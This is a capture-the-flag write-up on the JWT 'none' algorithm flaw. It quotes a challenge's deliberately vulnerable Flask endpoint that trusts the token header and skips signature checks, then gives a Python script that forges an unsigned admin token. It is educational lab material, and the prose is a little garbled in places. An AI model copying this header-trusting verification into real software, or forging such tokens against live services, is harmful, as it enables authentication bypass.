
Lets look at JWT algorithms. The first part of a JWT is a JOSE (JavaScript object signing and encryption)  and when you decode it. It looks like this

```
{"typ":"JWT","alg":"HS256"}

```

This tells the server its a JWT and which algorithms to use to verify it. The server has to process this untrusted input before it is able to verify the integrity of a token! In ideal cryptographic protocols, you verify messages receive before performing operations on them. before performing any further operations on them, otherwise in Moxie Marlinspike's words, "it will somehow inevitably lead to doom".


The "none" algorithm in JWT is case in point. The link below takes you to a page where you can interact with a broken session API, which emulates a vulnerability that existed in a lot of JWT libraries. Use it to bypass authorisation and get the flag.

```
import base64
import json
import jwt # note this is the PyJWT module, not python-jwt


SECRET_KEY = ?
FLAG = ?


@chal.route('/no-way-jose/authorise/<token>/')
def authorise(token):
    token_b64 = token.replace('-', '+').replace('_', '/') # JWTs use base64url encoding
    try:
        header = json.loads(base64.b64decode(token_b64.split('.')[0] + "==="))
    except Exception as e:
        return {"error": str(e)}

    if "alg" in header:
        algorithm = header["alg"]
    else:
        return {"error": "There is no algorithm key in the header"}

    if algorithm == "HS256":
        try:
            decoded = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        except Exception as e:
            return {"error": str(e)}
    elif algorithm == "none":
        try:
            decoded = jwt.decode(token, algorithms=["none"], options={"verify_signature": False})
        except Exception as e:
            return {"error": str(e)}
    else:
        return {"error": "Cannot decode token"}

    if "admin" in decoded and decoded["admin"]:
        return {"response": f"Welcome admin, here is your flag: {FLAG}"}
    elif "username" in decoded:
        return {"response": f"Welcome {decoded['username']}"}
    else:
        return {"error": "There is something wrong with your session, goodbye"}


@chal.route('/no-way-jose/create_session/<username>/')
def create_session(username):
    encoded = jwt.encode({'username': username, 'admin': False}, SECRET_KEY, algorithm='HS256')
    return {"session": encoded}
```


Look at this piece of code right here.

```
if "alg" in header:
        algorithm = header["alg"]
```

So if we set the Alg to none then we can just base64 the Json which says Algorithm Heres my script to do this


```
import base64
import jwt
import json

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).decode().rstrip('=')


header = {
    "alg": "none",
    "typ": "JWT"
}

payload = {
    "username": "admin",
    "admin": True
}
encoded_header = base64url_encode(json.dumps(header).encode())
encoded_payload = base64url_encode(json.dumps(payload).encode())

jwt_token = f"{encoded_header}.{encoded_payload}."

print(jwt_token)
```

